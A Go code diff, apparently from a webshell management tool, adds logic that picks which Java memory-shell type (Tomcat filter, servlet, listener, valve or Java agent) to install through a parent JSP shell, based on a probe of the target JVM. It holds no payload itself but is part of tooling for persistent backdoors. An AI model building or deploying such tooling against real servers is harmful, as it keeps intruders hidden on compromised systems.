@@ -40,6 +40,124 @@ func NormalizeMemshellType(t string) (string, bool) {
 	return "", false
 }
 
+// MemshellTypePreference is the auto-selection order for container-mapped
+// types on Tomcat. Mapped types are preferred because they reuse the container
+// connector; agent is the last resort for containers we cannot map into.
+var MemshellTypePreference = []string{
+	MemshellTypeFilter,
+	MemshellTypeServlet,
+	MemshellTypeListener,
+	MemshellTypeValve,
+}
+
+// MemshellProbe is what the parent shell reported about the target JVM. It is
+// the evidence auto-selection is made from, so it is kept verbatim.
+type MemshellProbe struct {
+	Container   string
+	ServletAPI  string
+	JavaVersion string
+	Available   []string
+}
+
+// ParseMemshellProbe reads the probe ack fields into a typed view. Missing
+// fields stay empty instead of being guessed.
+func ParseMemshellProbe(fields map[string]string) MemshellProbe {
+	p := MemshellProbe{
+		Container:   strings.ToLower(strings.TrimSpace(fields["container"])),
+		ServletAPI:  strings.ToLower(strings.TrimSpace(fields["servlet_api"])),
+		JavaVersion: strings.TrimSpace(fields["java_version"]),
+	}
+	for _, v := range strings.Split(fields["types"], ",") {
+		if v = strings.ToLower(strings.TrimSpace(v)); v != "" {
+			p.Available = append(p.Available, v)
+		}
+	}
+	return p
+}
+
+// Has reports whether the target JVM advertised the given type.
+func (p MemshellProbe) Has(typ string) bool {
+	for _, v := range p.Available {
+		if v == typ {
+			return true
+		}
+	}
+	return false
+}
+
+// Describe renders the probe as a stable evidence string.
+func (p MemshellProbe) Describe() string {
+	return fmt.Sprintf("container=%s api=%s java=%s available=%s",
+		displayProbe(p.Container), displayProbe(p.ServletAPI), displayProbe(p.JavaVersion),
+		displayProbe(strings.Join(p.Available, ",")))
+}
+
+func displayProbe(v string) string {
+	if strings.TrimSpace(v) == "" {
+		return "unknown"
+	}
+	return v
+}
+
+// MemshellSelection is the outcome of type selection, carrying why the type was
+// chosen so the operator can audit an automatic decision.
+type MemshellSelection struct {
+	Type   string `json:"type"`
+	Auto   bool   `json:"auto"`
+	Reason string `json:"reason"`
+}
+
+// SelectMemshellType decides which memory-shell type to install. An explicit
+// operator choice is validated against the probe (overrides are kept); an empty
+// choice is resolved automatically from the probe. Mismatches always fail with
+// the observed environment named, never silently fall back to an unverified
+// type.
+func SelectMemshellType(p MemshellProbe, requested string) (MemshellSelection, error) {
+	if req := strings.TrimSpace(requested); req != "" {
+		typ, ok := NormalizeMemshellType(req)
+		if !ok {
+			return MemshellSelection{}, fmt.Errorf("type 必须是 %s", strings.Join(MemshellTypes, "/"))
+		}
+		if err := checkMemshellFit(p, typ); err != nil {
+			return MemshellSelection{}, err
+		}
+		return MemshellSelection{Type: typ, Auto: false,
+			Reason: "人工指定 " + typ + "；目标环境 " + p.Describe()}, nil
+	}
+	if len(p.Available) == 0 {
+		return MemshellSelection{}, fmt.Errorf("目标 JVM 未报告任何可用的内存马类型，拒绝盲选（%s）", p.Describe())
+	}
+	if p.Container == "tomcat" {
+		for _, typ := range MemshellTypePreference {
+			if p.Has(typ) {
+				return MemshellSelection{Type: typ, Auto: true,
+					Reason: fmt.Sprintf("自动选型：容器为 Tomcat，按 %s 优先级取 %s；目标环境 %s",
+						strings.Join(MemshellTypePreference, "→"), typ, p.Describe())}, nil
+			}
+		}
+	}
+	if p.Has(MemshellTypeAgent) {
+		reason := "自动选型：目标容器为 " + displayProbe(p.Container) + "，不支持容器映射，回退 agent；目标环境 " + p.Describe()
+		if p.Container == "tomcat" {
+			reason = "自动选型：容器为 Tomcat 但未报告可映射类型，回退 agent；目标环境 " + p.Describe()
+		}
+		return MemshellSelection{Type: MemshellTypeAgent, Auto: true, Reason: reason}, nil
+	}
+	return MemshellSelection{}, fmt.Errorf("目标 JVM 没有可用的内存马类型（%s）", p.Describe())
+}
+
+// checkMemshellFit validates one type against the probe.
+func checkMemshellFit(p MemshellProbe, typ string) error {
+	if typ != MemshellTypeAgent && p.Container != "tomcat" {
+		return fmt.Errorf("目标容器不是 Tomcat，当前仅支持 agent 型内存马（%s）", p.Describe())
+	}
+	if !p.Has(typ) {
+		return fmt.Errorf("目标 JVM 不支持 %s 型内存马（可用：%s）", typ,
+			displayProbe(strings.Join(p.Available, ",")))
+	}
+	return nil
+}
+
 // MemshellSpec is one install request handed to the parent JSP shell.
 type MemshellSpec struct {
 	Type    string
